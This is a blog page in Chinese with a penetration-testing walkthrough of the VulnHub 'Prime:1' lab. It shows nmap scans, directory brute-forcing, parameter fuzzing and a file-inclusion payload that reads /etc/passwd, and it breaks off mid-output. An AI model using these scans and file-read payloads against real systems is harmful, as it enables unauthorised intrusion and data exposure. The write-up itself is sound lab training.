@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="靶场地址prime:1 端口发现sudo nmap 192.168.1.0&#x2F;24 -sn扫描主机192.168.1.101为目标ip扫描端口sudo nmap -p- --min-rate&#x3D;10000 192.168.1.101 -oA nmapscan&#x2F;ports并将结果留档开放了22和80两个端口，使用tcp扫描一下详细信息sudo nmap -sT -sC -sV -O 192.168.1.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="靶场实战：prime1">
+<meta property="og:url" content="https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/index.html">
+<meta property="og:site_name" content="ta3shi 个人学习自用">
+<meta property="og:description" content="靶场地址prime:1 端口发现sudo nmap 192.168.1.0&#x2F;24 -sn扫描主机192.168.1.101为目标ip扫描端口sudo nmap -p- --min-rate&#x3D;10000 192.168.1.101 -oA nmapscan&#x2F;ports并将结果留档开放了22和80两个端口，使用tcp扫描一下详细信息sudo nmap -sT -sC -sV -O 192.168.1.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749366176601.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749366276495.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749366355418.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749367121586.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749366527780.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749367205309.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749368942395.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749370362206.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749370539385.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749371303432.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749372025444.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749372078120.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749373743119.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749373795335.png">
+<meta property="article:published_time" content="2025-06-07T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-06-08T09:15:50.162Z">
+<meta property="article:author" content="ta3shi">
+<meta property="article:tag" content="linux提权">
+<meta property="article:tag" content="vulnhub靶场">
+<meta property="article:tag" content="靶场实战">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749366176601.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>靶场实战：prime1</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/&text=靶场实战：prime1"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/&title=靶场实战：prime1"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/&is_video=false&description=靶场实战：prime1"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=靶场实战：prime1&body=Check out this article: https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/&title=靶场实战：prime1"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/&title=靶场实战：prime1"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/&title=靶场实战：prime1"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/&title=靶场实战：prime1"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/&name=靶场实战：prime1&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/&t=靶场实战：prime1"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E5%8F%91%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">端口发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="toc-number">2.</span> <span class="toc-text">目录爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">开始渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95"><span class="toc-number">3.1.</span> <span class="toc-text">模糊测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WordPress%E6%89%AB%E6%8F%8F"><span class="toc-number">3.2.</span> <span class="toc-text">WordPress扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97wordpress%E5%90%8E%E5%8F%B0%E6%9D%83%E9%99%90"><span class="toc-number">3.3.</span> <span class="toc-text">获得wordpress后台权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        靶场实战：prime1
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ta3shi</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-07T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-06-08</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/">靶场实战</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/linux%E6%8F%90%E6%9D%83/" rel="tag">linux提权</a>, <a class="p-category" href="/tags/vulnhub%E9%9D%B6%E5%9C%BA/" rel="tag">vulnhub靶场</a>, <a class="p-category" href="/tags/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/" rel="tag">靶场实战</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>靶场地址<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/prime-1,358/">prime:1</a></p>
+<h2 id="端口发现"><a href="#端口发现" class="headerlink" title="端口发现"></a>端口发现</h2><p><code>sudo nmap 192.168.1.0/24 -sn</code>扫描主机<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749366176601.png">192.168.1.101为目标ip<br>扫描端口<code>sudo nmap -p- --min-rate=10000 192.168.1.101 -oA nmapscan/ports</code>并将结果留档<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749366276495.png"><br>开放了22和80两个端口，使用tcp扫描一下详细信息<br><code>sudo nmap -sT -sC -sV -O 192.168.1.101 -p22,80 -oA nmapscan/detail</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749366355418.png"><br>使用nmap默认漏洞脚本扫描一下<br><code>sudo nmap --script=vuln -p22,80 192.168.1.101 -oA nmapscan/vuln</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749367121586.png"><br>最后再扫描一下udp相关端口，确保不会错过信息<br><code>sudo nmap -sU --top-ports 20 192.168.1.101 -oA nmapscan/udp</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749366527780.png"></p>
+<h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>可以用多个工具尝试并对比<br>这里用gobuster扫了一下<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749367205309.png"><br>有个dev看看是什么</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hello,</span><br><span class="line"></span><br><span class="line">now you are at level 0 stage.</span><br><span class="line"></span><br><span class="line">In real life pentesting we should use our tools to dig on a web very hard.</span><br><span class="line"></span><br><span class="line">Happy hacking. </span><br></pre></td></tr></table></figure>
+<p>另外扫描的结果和vuln的结果都指向存在一个word-press<br>此外可以尝试指定扩展名爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">sudo dirb http://192.168.1.101 -X .zip,.txt,.php -o dirbout.txt                                                       </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">OUTPUT_FILE: dirbout.txt</span><br><span class="line">START_TIME: Sun Jun  8 03:23:11 2025</span><br><span class="line">URL_BASE: http://192.168.1.101/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">EXTENSIONS_LIST: (.zip,.txt,.php) | (.zip)(.txt)(.php) [NUM = 3]</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.1.101/ ----</span><br><span class="line">+ http://192.168.1.101/image.php (CODE:200|SIZE:147)                                                                                                                                                                                       </span><br><span class="line">+ http://192.168.1.101/index.php (CODE:200|SIZE:136)                                                                                                                                                                                       </span><br><span class="line">+ http://192.168.1.101/secret.txt (CODE:200|SIZE:412)                                                                                                                                                                                      </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sun Jun  8 03:23:32 2025</span><br><span class="line">DOWNLOADED: 13836 - FOUND: 3</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>扫到一个奇怪的txt，打开看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Looks like you have got some secrets.</span><br><span class="line"></span><br><span class="line">Ok I just want to do some help to you. </span><br><span class="line"></span><br><span class="line">Do some more fuzz on every page of php which was finded by you. And if</span><br><span class="line">you get any right parameter then follow the below steps. If you still stuck </span><br><span class="line">Learn from here a basic tool with good usage for OSCP.</span><br><span class="line">对你找到的每个 PHP 页面进行更多模糊测试。如果你</span><br><span class="line">找到了正确的参数，请按照以下步骤操作。如果你仍然卡住，</span><br><span class="line">可以在这里学习一个适用于 OSCP 的基本工具。</span><br><span class="line">https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web</span><br><span class="line"></span><br><span class="line">//see the location.txt and you will get your next move//</span><br></pre></td></tr></table></figure>
+<h2 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h2><h3 id="模糊测试"><a href="#模糊测试" class="headerlink" title="模糊测试"></a>模糊测试</h3><p>根据刚刚扫描的结果，存在两个php页面即image.php和index.php，这里使用一个模糊测试工具测试参数<br><code>sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.1.101/index.php?FUZZ=aa</code><br><code>sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.1.101/image.php?FUZZ=aa</code> -c将输出结果彩色显示，-w指定字典<br>出现了951个结果都是200的<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749368942395.png"><br>可以看到大部分都是12word的，我们用hw过滤一下12w的，对两个php页面都尝试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hw 12 http://192.168.1.101/image.php?FUZZ=aa</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://192.168.1.101/image.php?FUZZ=aa</span><br><span class="line">Total requests: 951</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    </span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Total time: 0</span><br><span class="line">Processed Requests: 951</span><br><span class="line">Filtered Requests: 951</span><br><span class="line">Requests/sec.: 0</span><br></pre></td></tr></table></figure>
+<p>image.php没有返回结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hw 12 http://192.168.1.101/index.php?FUZZ=aa</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://192.168.1.101/index.php?FUZZ=aa</span><br><span class="line">Total requests: 951</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    </span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000000341:   200        7 L      19 W       206 Ch      &quot;file&quot;                                                                                                                                                                     </span><br><span class="line"></span><br><span class="line">Total time: 0</span><br><span class="line">Processed Requests: 951</span><br><span class="line">Filtered Requests: 950</span><br><span class="line">Requests/sec.: 0</span><br></pre></td></tr></table></figure>
+<p>而index.php返回了一个file，说明file就是我们想要的参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo curl  http://192.168.1.101/index.php?file=a            </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;HacknPentest&lt;/title&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;img src=&#x27;hacknpentest.png&#x27; alt=&#x27;hnp security&#x27; width=&quot;1300&quot; height=&quot;595&quot; /&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">Do something better &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;you are digging wrong file&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>这里说我们找对了方向，但是文件错误，根据之前提示，尝试location.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo curl  http://192.168.1.101/index.php?file=location.txt </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;HacknPentest&lt;/title&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;img src=&#x27;hacknpentest.png&#x27; alt=&#x27;hnp security&#x27; width=&quot;1300&quot; height=&quot;595&quot; /&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">Do something better &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;ok well Now you reah at the exact parameter &lt;br&gt;&lt;br&gt;Now dig some more for next one &lt;br&gt;use &#x27;secrettier360&#x27; parameter on some other php page for more fun.</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>这里提示我们用secrettier360作为参数在另外的php页面,即image.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo curl  http://192.168.1.101/image.php?secrettier360=1   </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;HacknPentest&lt;/title&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;img src=&#x27;hacknpentest.png&#x27; alt=&#x27;hnp security&#x27; width=&quot;1300&quot; height=&quot;595&quot; /&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">finaly you got the right parameter&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>按照前面在index上的file，猜测会不会是文件读取，尝试读取passwd文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">sudo curl  http://192.168.1.101/image.php?secrettier360=file:///etc/passwd</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;HacknPentest&lt;/title&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;img src=&#x27;hacknpentest.png&#x27; alt=&#x27;hnp security&#x27; width=&quot;1300&quot; height=&quot;595&quot; /&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">finaly you got the right parameter&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">syslog:x:104:108::/home/syslog:/bin/false</span><br><span class="line">_apt:x:105:65534::/nonexistent:/bin/false</span><br><span class="line">messagebus:x:106:110::/var/run/dbus:/bin/false</span><br><span class="line">uuidd:x:107:111::/run/uuidd:/bin/false</span><br><span class="line">lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false</span><br><span class="line">whoopsie:x:109:117::/nonexistent:/bin/false</span><br><span class="line">avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false</span><br><span class="line">avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false</span><br><span class="line">dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false</span><br><span class="line">colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false</span><br><span class="line">speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false</span><br><span class="line">hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false</span><br><span class="line">kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false</span><br><span class="line">pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false</span><br><span class="line">rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false</span><br><span class="line">saned:x:119:127::/var/lib/saned:/bin/false</span><br><span class="line">usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false</span><br><span class="line">victor:x:1000:1000:victor,,,:/home/victor:/bin/bash</span><br><span class="line">mysql:x:121:129:MySQL 